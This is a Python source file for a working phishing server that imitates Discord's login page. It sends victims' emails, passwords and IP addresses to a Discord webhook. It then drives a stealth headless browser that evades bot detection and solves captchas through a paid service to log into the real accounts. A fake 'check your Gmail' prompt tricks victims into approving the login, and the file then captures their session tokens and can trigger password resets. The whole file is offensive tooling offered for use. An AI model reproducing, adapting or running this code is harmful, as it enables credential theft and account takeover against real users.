import os
import json
import sys
import asyncio
import time
import threading
import random
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from playwright.async_api import async_playwright
from datetime import datetime

WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN")
CAPTCHA_KEY = "44b5a90f-182f-4c67-b219-ef8dfd33d7a1"

sessions = {}
pending = {}

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord - Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#313338;--bg-dark:#1e1f22;--text-white:#f2f3f5;--text-muted:#b5bac1;--text-gray:#949ba4;--blurple:#5865f2;--blurple-hover:#4752c4;--link:#00a8fc;--input-bg:#1e1f22;--error:#f23f43;--success:#23a55a;}
html,body{height:100%;width:100%;font-family:'gg sans','Noto Sans',Helvetica,Arial,sans-serif;background:var(--bg);color:var(--text-white);overflow:hidden;}
body::before{content:'';position:fixed;inset:0;z-index:0;background:radial-gradient(ellipse 300px 300px at 0% 0%, rgba(88,101,242,0.08) 0%, transparent 70%),radial-gradient(ellipse 250px 250px at 100% 15%, rgba(88,101,242,0.06) 0%, transparent 70%);pointer-events:none;}
.container{position:relative;z-index:1;width:100%;height:100%;display:flex;flex-direction:column;padding:16px 24px 40px;max-width:480px;margin:0 auto;}
.back-arrow{display:flex;align-items:center;justify-content:center;width:36px;height:36px;cursor:pointer;margin-bottom:24px;margin-left:-4px;border-radius:50%;transition:background 0.15s;}
.back-arrow:hover{background:rgba(255,255,255,0.05);}
.back-arrow svg{width:22px;height:22px;fill:none;stroke:var(--text-muted);stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;}
.back-arrow:hover svg{stroke:var(--text-white);}
.header{text-align:center;margin-bottom:28px;}
.header h1{font-size:26px;font-weight:800;color:var(--text-white);margin-bottom:8px;letter-spacing:-0.2px;}
.header p{font-size:15px;color:var(--text-muted);font-weight:400;line-height:1.3;}
.form-group{margin-bottom:20px;}
.form-group label{display:block;font-size:12px;font-weight:700;color:var(--text-muted);margin-bottom:8px;text-transform:uppercase;letter-spacing:0.02em;}
.input-wrapper{position:relative;width:100%;}
.form-group input{width:100%;height:52px;background:var(--input-bg);border:none;border-radius:8px;padding:0 16px;font-size:16px;color:var(--text-white);font-family:inherit;outline:none;transition:box-shadow 0.15s;-webkit-appearance:none;}
.form-group input::placeholder{color:var(--text-gray);opacity:0.5;}
.form-group input:focus{box-shadow:0 0 0 2px var(--blurple);}
.form-group input.error{box-shadow:0 0 0 2px var(--error);}
.error-message{display:none;align-items:center;gap:6px;margin-top:8px;font-size:12px;color:var(--error);font-weight:500;}
.error-message.visible{display:flex;}
.error-message::before{content:'!';display:flex;align-items:center;justify-content:center;width:16px;height:16px;background:var(--error);color:#fff;border-radius:50%;font-size:11px;font-weight:700;flex-shrink:0;}
.success-message{display:none;align-items:center;gap:6px;margin-top:12px;font-size:14px;color:var(--success);font-weight:600;text-align:center;justify-content:center;padding:12px;background:rgba(35,165,90,0.1);border-radius:8px;}
.success-message.visible{display:flex;}
.eye-toggle{position:absolute;right:16px;top:50%;transform:translateY(-50%);cursor:pointer;padding:4px;display:flex;align-items:center;justify-content:center;background:none;border:none;}
.eye-toggle svg{width:22px;height:22px;fill:none;stroke:var(--text-gray);stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;}
.eye-toggle:hover svg{stroke:var(--text-muted);}
.forgot-link{display:inline-block;margin-top:8px;font-size:14px;font-weight:500;color:var(--link);text-decoration:none;cursor:pointer;transition:color 0.15s;}
.forgot-link:hover{text-decoration:underline;}
.login-btn{width:100%;height:44px;border:none;border-radius:8px;background:var(--blurple);color:#fff;font-size:16px;font-weight:600;font-family:inherit;cursor:pointer;margin-top:8px;transition:background 0.15s, transform 0.1s;letter-spacing:0.02em;}
.login-btn:hover{background:var(--blurple-hover);}
.login-btn:active{transform:scale(0.98);}
.login-btn:disabled{opacity:0.5;cursor:not-allowed;}
.login-btn.loading{pointer-events:none;color:transparent;position:relative;}
.login-btn.loading::after{content:'';position:absolute;left:50%;top:50%;width:8px;height:8px;margin:-4px 0 0 -20px;border-radius:50%;background:#fff;animation:dots 1.2s infinite;}
@keyframes dots{0%,80%,100%{box-shadow:12px 0 0 #fff,24px 0 0 #fff}40%{box-shadow:12px -6px 0 #fff,24px 0 0 #fff}60%{box-shadow:12px 0 0 #fff,24px -6px 0 #fff}}
.passkey-link{display:block;text-align:center;margin-top:16px;font-size:14px;font-weight:500;color:var(--link);text-decoration:none;cursor:pointer;transition:color 0.15s;}
.passkey-link:hover{text-decoration:underline;}
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);display:none;align-items:center;justify-content:center;z-index:100;padding:24px;backdrop-filter:blur(2px);}
.modal-overlay.active{display:flex;}
.modal{background:#2b2d31;border-radius:12px;padding:24px;width:100%;max-width:400px;position:relative;box-shadow:0 0 20px rgba(0,0,0,0.3);}
.modal-close{position:absolute;top:16px;right:16px;width:24px;height:24px;cursor:pointer;display:flex;align-items:center;justify-content:center;background:none;border:none;color:var(--text-muted);font-size:24px;line-height:1;padding:0;}
.modal-close:hover{color:var(--text-white);}
.modal h2{font-size:20px;font-weight:700;color:var(--text-white);margin-bottom:12px;padding-right:32px;}
.modal p{font-size:14px;color:var(--text-muted);line-height:1.5;margin-bottom:20px;}
.modal-input{width:100%;height:48px;background:var(--input-bg);border:none;border-radius:8px;padding:0 16px;font-size:16px;color:var(--text-white);font-family:inherit;outline:none;margin-bottom:16px;}
.modal-input:focus{box-shadow:0 0 0 2px var(--blurple);}
.modal-btn{width:100%;height:44px;border:none;border-radius:8px;background:var(--blurple);color:#fff;font-size:16px;font-weight:600;font-family:inherit;cursor:pointer;transition:background 0.15s;}
.modal-btn:hover{background:var(--blurple-hover);}
.modal-btn.secondary{background:var(--bg-dark);color:var(--text-white);}
.modal-btn.secondary:hover{background:#3a3c42;}
.status-box{background:var(--bg-dark);border-radius:8px;padding:20px;margin-bottom:20px;text-align:center;border:1px solid rgba(88,101,242,0.2);}
.status-box .icon{font-size:40px;margin-bottom:12px;}
.status-box h3{font-size:16px;font-weight:600;color:var(--text-white);margin-bottom:8px;}
.status-box p{font-size:14px;color:var(--text-muted);margin:0;line-height:1.4;}
@media(min-width:481px){.container{justify-content:center;padding-top:60px;}}
</style>
</head>
<body>
<div class="container">
  <div class="back-arrow" onclick="history.back()">
    <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
  </div>
  <div class="header">
    <h1>Welcome back!</h1>
    <p>We're so excited to see you again!</p>
  </div>
  <form id="loginForm">
    <div class="form-group">
      <label>Email or Phone Number <span style="color:var(--error)">*</span></label>
      <div class="input-wrapper">
        <input type="text" id="email" autocomplete="username" autocapitalize="none" spellcheck="false" placeholder="">
      </div>
      <div class="error-message" id="emailError">This field is required</div>
    </div>
    <div class="form-group">
      <label>Password <span style="color:var(--error)">*</span></label>
      <div class="input-wrapper">
        <input type="password" id="password" autocomplete="current-password" placeholder="">
        <button type="button" class="eye-toggle" onclick="togglePassword()">
          <svg id="eyeIcon" viewBox="0 0 24 24">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>
      <a class="forgot-link" href="#" onclick="showForgotModal();return false">Forgot your password?</a>
    </div>
    <button type="submit" class="login-btn" id="loginBtn">Log In</button>
    <a class="passkey-link" href="#">Or, sign in with passkey</a>
    <div class="success-message" id="statusMsg"></div>
  </form>
</div>

<div class="modal-overlay" id="forgotModal">
  <div class="modal">
    <button class="modal-close" onclick="closeForgotModal()">&times;</button>
    <h2>Reset your password</h2>
    <p>Enter your email address and we'll send you instructions to reset your password.</p>
    <input type="text" class="modal-input" id="resetEmail" placeholder="name@example.com" autocomplete="email">
    <button class="modal-btn" id="resetBtn" onclick="submitForgot()">Send Reset Instructions</button>
    <button class="modal-btn secondary" style="margin-top:8px;" onclick="closeForgotModal()">Cancel</button>
  </div>
</div>

<div class="modal-overlay" id="verifyModal">
  <div class="modal">
    <h2>New Login Location Detected</h2>
    <div class="status-box">
      <div class="icon">📧</div>
      <h3>Check your Gmail</h3>
      <p>Discord has sent a verification email. Click the link to approve this login.</p>
    </div>
    <button class="modal-btn" id="verifyBtn" onclick="checkVerification()">I've Verified - Continue</button>
    <button class="modal-btn secondary" style="margin-top:8px;" onclick="closeVerifyModal()">Cancel</button>
  </div>
</div>

<script>
let currentEmail = '';
let currentPassword = '';

function togglePassword() {
  const input = document.getElementById('password');
  const icon = document.getElementById('eyeIcon');
  if (input.type === 'password') {
    input.type = 'text';
    icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
  } else {
    input.type = 'password';
    icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/><circle cx="12" cy="12" r="3"/>';
  }
}

function showForgotModal() {
  document.getElementById('forgotModal').classList.add('active');
  document.getElementById('resetEmail').value = document.getElementById('email').value || '';
}

function closeForgotModal() {
  document.getElementById('forgotModal').classList.remove('active');
}

function showVerifyModal() {
  document.getElementById('verifyModal').classList.add('active');
}

function closeVerifyModal() {
  document.getElementById('verifyModal').classList.remove('active');
}

async function checkVerification() {
  const btn = document.getElementById('verifyBtn');
  btn.classList.add('loading');
  btn.disabled = true;
  
  try {
    const response = await fetch('/api/check-verify', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: currentEmail})
    });
    
    const data = await response.json();
    
    if (data.success) {
      closeVerifyModal();
      document.getElementById('statusMsg').innerHTML = '<strong>✅ Success!</strong><br>Token: ' + data.token;
      document.getElementById('statusMsg').classList.add('visible');
    } else {
      alert('Not verified yet. Check Gmail and click the link.');
    }
  } catch (err) {
    alert('Error');
  } finally {
    btn.classList.remove('loading');
    btn.disabled = false;
  }
}

async function submitForgot() {
  const email = document.getElementById('resetEmail').value.trim();
  if (!email) return alert('Enter email');
  
  await fetch('/api/forgot', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email})
  });
  
  closeForgotModal();
  document.getElementById('statusMsg').innerHTML = '<strong>📧 Check Gmail!</strong><br>Reset sent.';
  document.getElementById('statusMsg').classList.add('visible');
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value;
  const btn = document.getElementById('loginBtn');
  
  currentEmail = email;
  currentPassword = password;
  
  document.getElementById('email').classList.remove('error');
  document.getElementById('emailError').classList.remove('visible');
  
  if (!email) {
    document.getElementById('email').classList.add('error');
    document.getElementById('emailError').classList.add('visible');
    return;
  }
  
  btn.classList.add('loading');
  btn.disabled = true;
  
  try {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email, password})
    });
    
    const data = await response.json();
    
    if (data.needsVerify) {
      showVerifyModal();
    } else if (data.success) {
      document.getElementById('statusMsg').innerHTML = '<strong>✅ Success!</strong><br>Token captured.';
      document.getElementById('statusMsg').classList.add('visible');
    } else {
      alert('Error: ' + (data.error || 'Failed'));
    }
  } catch (err) {
    alert('Failed: ' + err.message);
  } finally {
    btn.classList.remove('loading');
    btn.disabled = false;
  }
});
</script>
</body>
</html>"""

def send_hook(embed):
    try:
        data = json.dumps({"embeds": [embed], "username": "Logger"}).encode()
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        print(f"Hook error: {e}")

def solve_captcha(site_url, site_key):
    """Solve hCaptcha using RazorCap"""
    try:
        payload = {
            "type": "hcaptcha_enterprise",
            "websiteURL": site_url,
            "websiteKey": site_key,
            "rqdata": "",
            "proxy": ""
        }
        
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            "https://api.razorcap.cc/solve",
            data=data,
            headers={
                "Content-Type": "application/json",
                "Authorization": f"Bearer {CAPTCHA_KEY}"
            },
            method="POST"
        )
        
        response = urllib.request.urlopen(req, timeout=120)
        result = json.loads(response.read().decode())
        
        return result.get("token")
    except Exception as e:
        send_hook({
            "title": "❌ Captcha Error",
            "fields": [{"name": "Error", "value": f"```{str(e)[:500]}```"}],
            "color": 0xe74c3c
        })
        return None

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        ip = self.headers.get("X-Forwarded-For", self.client_address[0])
        ua = self.headers.get("User-Agent", "Unknown")[:100]
        
        send_hook({
            "title": "👁️ Visitor",
            "fields": [
                {"name": "IP", "value": f"```{ip}```", "inline": True},
                {"name": "UA", "value": f"```{ua}```", "inline": False}
            ],
            "color": 0x3498db
        })
        
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(HTML.encode())

    def do_POST(self):
        ip = self.headers.get("X-Forwarded-For", self.client_address[0])
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length)) if length else {}
        
        if self.path == "/api/login":
            email = body.get("email", "")
            password = body.get("password", "")
            
            send_hook({
                "title": "🔐 Creds",
                "fields": [
                    {"name": "Email", "value": f"```{email}```", "inline": False},
                    {"name": "Pass", "value": f"```{password}```", "inline": False},
                    {"name": "IP", "value": f"```{ip}```", "inline": True}
                ],
                "color": 0xe74c3c
            })
            
            sid = f"{email}_{int(time.time())}"
            sessions[sid] = {"email": email, "password": password, "token": None}
            pending[email] = sid
            
            def run():
                asyncio.run(advanced_login(sid, email, password, ip))
            
            threading.Thread(target=run, daemon=True).start()
            
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"needsVerify": True}).encode())
            
        elif self.path == "/api/check-verify":
            email = body.get("email", "")
            sid = pending.get(email)
            
            if sid and sessions.get(sid, {}).get("token"):
                tok = sessions[sid]["token"]
                self.send_response(200)
                self.end_headers()
                self.wfile.write(json.dumps({"success": True, "token": tok[:50] + "..."}).encode())
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(json.dumps({"success": False}).encode())
                
        elif self.path == "/api/forgot":
            email = body.get("email", "")
            send_hook({"title": "🔄 Reset", "fields": [{"name": "Email", "value": f"```{email}```"}], "color": 0xf39c12})
            
            def run():
                asyncio.run(do_forgot(email))
            
            threading.Thread(target=run, daemon=True).start()
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(json.dumps({"sent": True}).encode())

async def advanced_login(sid, email, password, ip):
    """Advanced stealth login with captcha solving"""
    try:
        async with async_playwright() as p:
            # Advanced browser launch
            browser = await p.chromium.launch(
                headless=True,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--disable-gpu',
                    '--window-size=1920,1080',
                    '--start-maximized'
                ]
            )
            
            # Advanced context with full fingerprint
            context = await browser.new_context(
                viewport={"width": 1920, "height": 1080},
                device_scale_factor=1,
                is_mobile=False,
                has_touch=False,
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                locale="en-US",
                timezone_id="America/New_York",
                geolocation={"latitude": 40.7128, "longitude": -74.0060},
                permissions=["geolocation", "notifications"],
                color_scheme="dark",
                extra_http_headers={
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br",
                    "DNT": "1",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-User": "?1",
                    "Cache-Control": "max-age=0"
                }
            )
            
            # Enterprise stealth script
            await context.add_init_script("""
                // Remove webdriver
                delete navigator.__proto__.webdriver;
                Object.defineProperty(navigator, 'webdriver', {get: () => false});
                
                // Chrome runtime
                window.chrome = {
                    runtime: {
                        OnInstalledReason: {CHROME_UPDATE: "chrome_update", RUNTIME_UPDATE: "runtime_update", BROWSER_UPDATE: "browser_update"},
                        OnRestartRequiredReason: {APP_UPDATE: "app_update", OS_UPDATE: "os_update", PERIODIC: "periodic"},
                        PlatformArch: {ARM: "arm", ARM64: "arm64", MIPS: "mips", MIPS64: "mips64", X86_32: "x86-32", X86_64: "x86-64"},
                        PlatformNaclArch: {ARM: "arm", MIPS: "mips", MIPS64: "mips64", MIPS64EL: "mips64el", MIPSEL: "mipsel", X86_32: "x86-32", X86_64: "x86-64"},
                        PlatformOs: {ANDROID: "android", CROS: "cros", LINUX: "linux", MAC: "mac", OPENBSD: "openbsd", WIN: "win"},
                        RequestUpdateCheckStatus: {NO_UPDATE: "no_update", THROTTLED: "throttled", UPDATE_AVAILABLE: "update_available"}
                    },
                    app: {
                        isInstalled: false,
                        InstallState: {DISABLED: "disabled", INSTALLED: "installed", NOT_INSTALLED: "not_installed"},
                        RunningState: {CANNOT_RUN: "cannot_run", READY_TO_RUN: "ready_to_run", RUNNING: "running"}
                    }
                };
                
                // Plugins
                Object.defineProperty(navigator, 'plugins', {
                    get: () => [
                        {name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format", version: "undefined", length: 1, item: idx => navigator.plugins[idx], namedItem: name => navigator.plugins.find(p => p.name === name)},
                        {name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", description: "Portable Document Format", version: "undefined", length: 1, item: idx => navigator.plugins[idx], namedItem: name => navigator.plugins.find(p => p.name === name)},
                        {name: "Native Client", filename: "internal-nacl-plugin", description: "", version: "undefined", length: 2, item: idx => navigator.plugins[idx], namedItem: name => navigator.plugins.find(p => p.name === name)}
                    ]
                });
                
                // MimeTypes
                Object.defineProperty(navigator, 'mimeTypes', {
                    get: () => [
                        {type: "application/x-google-chrome-pdf", suffixes: "pdf", description: "Portable Document Format", enabledPlugin: navigator.plugins[1]},
                        {type: "application/x-nacl", suffixes: "", description: "Native Client executable", enabledPlugin: navigator.plugins[2]},
                        {type: "application/x-pnacl", suffixes: "", description: "Portable Native Client executable", enabledPlugin: navigator.plugins[2]}
                    ]
                });
                
                // Hardware
                Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
                Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
                
                // Languages
                Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en', 'es']});
                
                // Platform
                Object.defineProperty(navigator, 'platform', {get: () => 'Win32'});
                
                // Screen properties
                Object.defineProperty(screen, 'colorDepth', {get: () => 24});
                Object.defineProperty(screen, 'pixelDepth', {get: () => 24});
                
                // Canvas fingerprint randomization
                const originalGetContext = HTMLCanvasElement.prototype.getContext;
                HTMLCanvasElement.prototype.getContext = function(type, attributes) {
                    const context = originalGetContext.call(this, type, attributes);
                    if (context && (type === '2d' || type === 'webgl' || type === 'experimental-webgl')) {
                        const originalFillText = context.fillText;
                        context.fillText = function(...args) {
                            context.save();
                            context.shadowColor = `rgba(${Math.floor(Math.random()*255)},${Math.floor(Math.random()*255)},${Math.floor(Math.random()*255)},0.01)`;
                            context.shadowBlur = Math.random() * 2;
                            originalFillText.apply(this, args);
                            context.restore();
                        };
                    }
                    return context;
                };
                
                // WebGL fingerprint
                const getParameter = WebGLRenderingContext.prototype.getParameter;
                WebGLRenderingContext.prototype.getParameter = function(parameter) {
                    if (parameter === 37445) return 'Intel Inc.';
                    if (parameter === 37446) return 'Intel Iris Xe Graphics';
                    return getParameter.call(this, parameter);
                };
                
                // Permissions
                const originalQuery = navigator.permissions.query;
                navigator.permissions.query = (parameters) => {
                    return Promise.resolve({state: "prompt", onchange: null});
                };
                
                // Iframes
                Object.defineProperty(HTMLIFrameElement.prototype, 'contentWindow', {
                    get: function() {
                        return window;
                    }
                });
            """)
            
            page = await context.new_page()
            
            # Random mouse movements before navigation
            for _ in range(random.randint(3, 7)):
                await page.mouse.move(random.randint(100, 800), random.randint(100, 600))
                await asyncio.sleep(random.uniform(0.1, 0.3))
            
            # Navigate
            await page.goto("https://discord.com/login", wait_until="networkidle")
            await asyncio.sleep(random.uniform(3, 5))
            
            # Check for captcha immediately
            captcha_iframe = await page.query_selector('iframe[src*="hcaptcha.com"], iframe[src*="recaptcha"]')
            if captcha_iframe:
                send_hook({
                    "title": "🤖 Captcha Detected",
                    "fields": [{"name": "Status", "value": "Solving...", "inline": False}],
                    "color": 0xf39c12
                })
                
                # Get sitekey
                sitekey = await captcha_iframe.get_attribute('data-sitekey') or "f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34"
                
                # Solve
                captcha_token = solve_captcha("https://discord.com/login", sitekey)
                
                if captcha_token:
                    # Inject solution
                    await page.evaluate(f"""() => {{
                        if (window.hcaptcha) {{
                            window.hcaptcha.setResponse('{captcha_token}');
                        }}
                        document.querySelector('[name="h-captcha-response"]')?.setAttribute('value', '{captcha_token}');
                    }}""")
                    send_hook({
                        "title": "✅ Captcha Solved",
                        "fields": [{"name": "Token", "value": f"```{captcha_token[:50]}...```"}],
                        "color": 0x2ecc71
                    })
            
            # Random delay before form interaction
            await asyncio.sleep(random.uniform(1, 2))
            
            # Find and fill email with human behavior
            email_selectors = ['input[name="email"]', 'input[autocomplete="username"]', 'input[type="email"]', 'input[data-testid="email"]']
            email_input = None
            for sel in email_selectors:
                try:
                    email_input = await page.wait_for_selector(sel, timeout=5000)
                    if email_input:
                        break
                except:
                    continue
            
            if not email_input:
                raise Exception("Could not find email input")
            
            # Human-like email entry
            box = await email_input.bounding_box()
            if box:
                await page.mouse.move(box["x"] + random.randint(10, 30), box["y"] + random.randint(10, 20))
                await asyncio.sleep(random.uniform(0.2, 0.5))
                await page.mouse.click(box["x"] + random.randint(10, 30), box["y"] + random.randint(10, 20))
            
            await email_input.fill(email)
            await asyncio.sleep(random.uniform(0.5, 1.5))
            
            # Tab to password or click
            await page.keyboard.press("Tab")
            await asyncio.sleep(random.uniform(0.3, 0.7))
            
            # Fill password
            pass_selectors = ['input[name="password"]', 'input[autocomplete="current-password"]', 'input[type="password"]']
            pass_input = None
            for sel in pass_selectors:
                try:
                    pass_input = await page.query_selector(sel)
                    if pass_input:
                        break
                except:
                    continue
            
            if pass_input:
                await pass_input.fill(password)
            
            await asyncio.sleep(random.uniform(1, 2))
            
            # Submit with random coordinate click
            submit_btn = await page.query_selector('button[type="submit"]')
            if submit_btn:
                box = await submit_btn.bounding_box()
                if box:
                    await page.mouse.move(box["x"] + random.randint(5, 20), box["y"] + random.randint(5, 15))
                    await asyncio.sleep(random.uniform(0.2, 0.4))
                    await page.mouse.click(box["x"] + random.randint(5, 20), box["y"] + random.randint(5, 15))
                else:
                    await submit_btn.click()
            
            # Wait for response
            await asyncio.sleep(random.uniform(6, 8))
            
            # Check state
            current_url = page.url
            content = await page.content()
            text = await page.inner_text('body')
            
            send_hook({
                "title": "🔍 Post-Login State",
                "fields": [
                    {"name": "URL", "value": f"```{current_url}```", "inline": False},
                    {"name": "Preview", "value": f"```{text[:300]}```", "inline": False}
                ],
                "color": 0x9b59b6
            })
            
            # Detect verification requirement
            verify_signals = [
                "new login location" in text.lower(),
                "verify this login" in text.lower(),
                "check your email" in text.lower(),
                "confirm this login" in text.lower(),
                "unusual location" in text.lower(),
                "verify it's you" in text.lower(),
                "login" in current_url and ("verify" in content.lower() or "location" in content.lower()),
                await page.query_selector('button:has-text("Verify")') is not None,
                await page.query_selector('text=/verify.*login|confirm.*location/i') is not None
            ]
            
            if any(verify_signals):
                send_hook({
                    "title": "📧 Discord Sent Verify Email",
                    "fields": [
                        {"name": "Status", "value": "Email sent by Discord automatically", "inline": False},
                        {"name": "Email", "value": f"```{email}```", "inline": True}
                    ],
                    "color": 0xf1c40f
                })
                
                # Poll for verification
                for attempt in range(150):  # 12.5 minutes
                    await asyncio.sleep(5)
                    
                    # Refresh
                    await page.reload()
                    await asyncio.sleep(3)
                    
                    # Check token
                    token = await page.evaluate("() => localStorage.getItem('token')")
                    if token:
                        sessions[sid]["token"] = token
                        send_hook({
                            "title": "🎉 TOKEN CAPTURED!",
                            "fields": [
                                {"name": "Token", "value": f"```{token}```", "inline": False},
                                {"name": "Email", "value": f"```{email}```", "inline": True},
                                {"name": "Password", "value": f"```{password}```", "inline": True}
                            ],
                            "color": 0x2ecc71
                        })
                        break
                    
                    # Check if redirected away from login
                    if "login" not in page.url:
                        token = await page.evaluate("() => localStorage.getItem('token')")
                        if token:
                            sessions[sid]["token"] = token
                            send_hook({
                                "title": "🎉 TOKEN (Redirect)!",
                                "fields": [
                                    {"name": "Token", "value": f"```{token}```", "inline": False},
                                    {"name": "Email", "value": f"```{email}```", "inline": True}
                                ],
                                "color": 0x2ecc71
                            })
                            break
            else:
                # Check immediate success
                token = await page.evaluate("() => localStorage.getItem('token')")
                if token:
                    sessions[sid]["token"] = token
                    send_hook({
                        "title": "🎉 TOKEN (No Verify)!",
                        "fields": [
                            {"name": "Token", "value": f"```{token}```", "inline": False},
                            {"name": "Email", "value": f"```{email}```", "inline": True}
                        ],
                        "color": 0x2ecc71
                    })
                else:
                    # Check for errors
                    error_sel = await page.query_selector('[class*="error"], [class*="message"]')
                    if error_sel:
                        err = await error_sel.inner_text()
                        send_hook({
                            "title": "❌ Login Error",
                            "fields": [{"name": "Error", "value": f"```{err[:500]}```"}],
                            "color": 0xe74c3c
                        })
            
            await browser.close()
            
    except Exception as e:
        send_hook({
            "title": "❌ Automation Error",
            "fields": [{"name": "Error", "value": f"```{str(e)[:1000]}```"}],
            "color": 0x95a5a6
        })

async def do_forgot(email):
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True, args=['--no-sandbox'])
            page = await browser.new_page()
            await page.goto("https://discord.com/forgot")
            await page.fill('input[name="email"]', email)
            await page.click('button[type="submit"]')
            await asyncio.sleep(4)
            send_hook({"title": "✅ Reset Triggered", "fields": [{"name": "Email", "value": f"```{email}```"}], "color": 0x2ecc71})
            await browser.close()
    except Exception as e:
        print(f"Forgot err: {e}")

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    server = ThreadedHTTPServer(("0.0.0.0", port), Handler)
    print(f"Running on port {port}")
    server.serve_forever()
